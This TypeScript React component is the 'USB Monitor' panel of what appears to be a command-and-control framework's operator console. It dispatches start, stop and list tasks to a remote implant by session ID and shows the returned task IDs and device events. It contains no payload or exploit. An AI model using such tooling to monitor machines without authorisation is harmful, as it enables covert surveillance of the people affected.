import { useState } from 'react';
import { taskClient } from '../../api';

interface Props {
  sessionId: string;
}

interface DeviceEvent {
  timestamp: string;
  deviceName: string;
  action: string;
}

function hexToUint8Array(hex: string): Uint8Array<ArrayBuffer> {
  const buffer = new ArrayBuffer(hex.length / 2);
  const bytes = new Uint8Array(buffer);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

export function USBMonitorPanel({ sessionId }: Props) {
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [taskId, setTaskId] = useState<string | null>(null);
  const [events, setEvents] = useState<DeviceEvent[]>([]);

  const dispatchTask = async (subcommand: string) => {
    setLoading(true);
    setError(null);
    try {
      const encoder = new TextEncoder();
      const taskData = encoder.encode(subcommand) as Uint8Array<ArrayBuffer>;

      const response = await taskClient.dispatchTask({
        implantId: { value: hexToUint8Array(sessionId) },
        taskType: 'usb_monitor',
        taskData,
      });

      const id = response.taskId
        ? Array.from(response.taskId.value).map(b => b.toString(16).padStart(2, '0')).join('')
        : '';
      setTaskId(id);
      return id;
    } catch (err: any) {
      setError(err.message || 'Failed to dispatch task');
      return null;
    } finally {
      setLoading(false);
    }
  };

  const handleToggle = async () => {
    const subcommand = isMonitoring ? 'stop' : 'start';
    const id = await dispatchTask(subcommand);
    if (id) {
      setIsMonitoring(!isMonitoring);
    }
  };

  const handleList = async () => {
    const id = await dispatchTask('list');
    if (id) {
      // Placeholder event to indicate list was dispatched
      setEvents(prev => [
        {
          timestamp: new Date().toLocaleTimeString(),
          deviceName: '(list dispatched — results via task stream)',
          action: 'list',
        },
        ...prev,
      ]);
    }
  };

  return (
    <div className="p-4 space-y-4">
      <div className="flex items-center justify-between">
        <h3 className="text-ctp-text font-semibold text-sm uppercase tracking-wide">USB Monitor</h3>
        <span
          className={`inline-flex items-center gap-1.5 text-xs px-2 py-1 rounded-full font-medium ${
            isMonitoring
              ? 'bg-ctp-green/20 text-ctp-green'
              : 'bg-ctp-surface1 text-ctp-subtext0'
          }`}
        >
          <span
            className={`w-1.5 h-1.5 rounded-full ${isMonitoring ? 'bg-ctp-green animate-pulse' : 'bg-ctp-subtext0'}`}
          />
          {isMonitoring ? 'Monitoring' : 'Inactive'}
        </span>
      </div>

      <div className="flex gap-2">
        <button
          onClick={handleToggle}
          disabled={loading}
          className={`px-4 py-2 rounded text-sm font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed ${
            isMonitoring
              ? 'bg-ctp-red text-ctp-base hover:bg-ctp-red/80'
              : 'bg-ctp-green text-ctp-base hover:bg-ctp-green/80'
          }`}
        >
          {loading ? 'Dispatching...' : isMonitoring ? 'Stop' : 'Start'}
        </button>
        <button
          onClick={handleList}
          disabled={loading}
          className="px-4 py-2 rounded text-sm font-medium bg-ctp-surface1 text-ctp-text hover:bg-ctp-surface2 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
        >
          List Devices
        </button>
      </div>

      {error && (
        <div className="px-3 py-2 rounded bg-ctp-red/20 text-ctp-red text-sm border border-ctp-red/30">
          {error}
        </div>
      )}

      {taskId && (
        <div className="text-xs text-ctp-subtext0">
          Task ID: <span className="font-mono text-ctp-blue">{taskId}</span>
        </div>
      )}

      <div className="rounded border border-ctp-surface2 bg-ctp-surface0 overflow-hidden">
        <div className="px-3 py-2 border-b border-ctp-surface2 flex items-center justify-between">
          <p className="text-xs text-ctp-subtext0 uppercase tracking-wide">Device Events</p>
          {events.length > 0 && (
            <button
              onClick={() => setEvents([])}
              className="text-xs text-ctp-subtext0 hover:text-ctp-text transition-colors"
            >
              Clear
            </button>
          )}
        </div>
        {events.length === 0 ? (
          <div className="px-3 py-6 text-center text-xs text-ctp-subtext0">
            No events yet. Start monitoring to capture USB activity.
          </div>
        ) : (
          <table className="w-full text-xs">
            <thead className="bg-ctp-crust">
              <tr className="text-left text-ctp-subtext0">
                <th className="px-3 py-1.5 font-medium w-28">Time</th>
                <th className="px-3 py-1.5 font-medium">Device</th>
                <th className="px-3 py-1.5 font-medium w-20">Action</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-ctp-surface1">
              {events.map((ev, i) => (
                <tr key={i} className="hover:bg-ctp-surface1/50">
                  <td className="px-3 py-1.5 font-mono text-ctp-subtext0">{ev.timestamp}</td>
                  <td className="px-3 py-1.5 text-ctp-text truncate max-w-0">{ev.deviceName}</td>
                  <td className="px-3 py-1.5">
                    <span
                      className={`px-1.5 py-0.5 rounded text-xs font-medium ${
                        ev.action === 'connect'
                          ? 'bg-ctp-green/20 text-ctp-green'
                          : ev.action === 'disconnect'
                          ? 'bg-ctp-red/20 text-ctp-red'
                          : 'bg-ctp-surface2 text-ctp-subtext0'
                      }`}
                    >
                      {ev.action}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>
    </div>
  );
}
